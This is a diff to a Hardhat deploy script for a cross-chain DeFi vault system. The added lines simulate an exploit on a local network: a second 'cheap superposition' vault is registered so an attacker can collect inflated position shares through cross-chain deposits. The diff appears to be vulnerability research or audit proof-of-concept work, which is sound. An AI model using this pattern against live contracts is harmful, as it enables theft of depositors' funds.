@@ -78,8 +78,7 @@ async function deployToLocahost() {
 
   console.log("BscUSDC address: ", BscUSDC.address);
 
-  const SwapToken = await ethers.getContractFactory("ERC20Mock");
-  swapToken = await SwapToken.deploy(
+  swapToken = await Token.deploy(
     "Swap",
     "SWP",
     accounts[0].address,
@@ -94,7 +93,15 @@ async function deployToLocahost() {
     "TSTFantomVault"
   );
 
+  /// Simulate for exploit. Here, user gets cheap superposition to overdrive allowance
+  FantomVaultCheapSuperPosition = await Vault.deploy(
+    FantomUSDC.address,
+    "FantomVaultCheapSuperPosition",
+    "TSTFantomVaultCheapSuperPosition"
+  );
+
   console.log("FantomVault address: ", FantomVault.address);
+  console.log("FantomCheapSuperPosition address: ", FantomVaultCheapSuperPosition.address);
 
   BscVault = await Vault.deploy(BscUSDC.address, "BscVault", "TSTBscVault");
 
@@ -142,7 +149,8 @@ async function deployToLocahost() {
       FantomLzEndpoint.address
     );
 
-  await FantomDst.addVault([FantomVault.address], [1]);
+  // Attacker will claim cheap SP tokens from here (cheaper than from regular FantomVault)
+  await FantomDst.addVault([FantomVault.address, FantomVaultCheapSuperPosition.address], [1, 2]);
   await BscDst.addVault([BscVault.address], [1]);
 
   await FantomDst.setSrcTokenDistributor(FantomSrc.address, FantomChainId);
@@ -174,6 +182,7 @@ async function deployToLocahost() {
 
   await FantomSrc.setBridgeAddress([1], [socket.address]);
   await BscSrc.setBridgeAddress([1], [socket.address]);
+
   await BscDst.setBridgeAddress([1], [socket.address]);
   await FantomDst.setBridgeAddress([1], [socket.address]);
 
@@ -187,6 +196,7 @@ async function deployToLocahost() {
   await BscStateHandler.grantRole(PROCESSOR_CONTRACT_ROLE, accounts[0].address);
 
   console.log("Deployed to localhost");
+  console.log("Socket.address: ", socket.address);
   console.log("SuperRouter(1) address: ", FantomSrc.address);
   console.log("SuperDestination(1) address: ", FantomDst.address);
   console.log("SuperRouter(2) address: ", BscSrc.address);
@@ -210,8 +220,6 @@ async function deployToLocahost() {
 
     /// Value == fee paid to relayer. API call in our design
     try {
-    //   console.log("log reqs");
-    //   console.log([liqReq], [stateReq]);
       await targetSource.deposit([liqReq], [stateReq], {
         value: ethers.utils.parseEther("1"),
       });
@@ -255,10 +263,11 @@ async function deployToLocahost() {
     return { stateReq: stateReq, LiqReq: LiqReq };
   }
 
-  const amount = ThousandTokensE18;
+  const amount = ethers.utils.parseEther("100");
   const vaultId = 1;
 
-  const Request = await buildDepositCall(
+  /// Deposit to BSC vault
+  let Request = await buildDepositCall(
     FantomSrc.address,
     BscDst.address,
     BscUSDC.address,
@@ -271,6 +280,44 @@ async function deployToLocahost() {
     BscUSDC,
     FantomSrc,
     BscDst,
+    Request.stateReq,
+    Request.LiqReq,
+    amount
+  );
+
+  /// Deposit to Fantom vault
+  Request = await buildDepositCall(
+    BscSrc.address,
+    FantomDst.address,
+    FantomUSDC.address,
+    vaultId,
+    amount,
+    FantomChainId
+  );
+
+  await depositToVault(
+    FantomUSDC,
+    BscSrc,
+    FantomDst,
+    Request.stateReq,
+    Request.LiqReq,
+    amount
+  );
+
+  /// Deposit to Cheap SP vault
+  Request = await buildDepositCall(
+    BscSrc.address,
+    FantomDst.address,
+    FantomUSDC.address,
+    2,
+    amount, /// Get big amount of SP shares from here
+    FantomChainId
+  );
+
+  await depositToVault(
+    FantomUSDC,
+    BscSrc,
+    FantomDst,
     Request.stateReq,
     Request.LiqReq,
     amount
